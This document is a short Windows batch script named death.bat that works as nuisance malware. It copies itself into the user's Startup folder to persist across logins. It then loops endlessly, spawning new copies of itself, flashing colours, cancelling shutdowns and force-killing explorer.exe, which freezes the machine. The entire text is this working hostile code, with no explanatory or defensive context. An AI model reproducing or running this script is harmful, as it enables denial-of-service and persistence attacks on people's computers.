@echo off
if not exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\death.bat" copy death.bat "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
:s
start "idiot" death.bat
color f0
color 40
shutdown -a
taskkill /f /im explorer.exe
goto s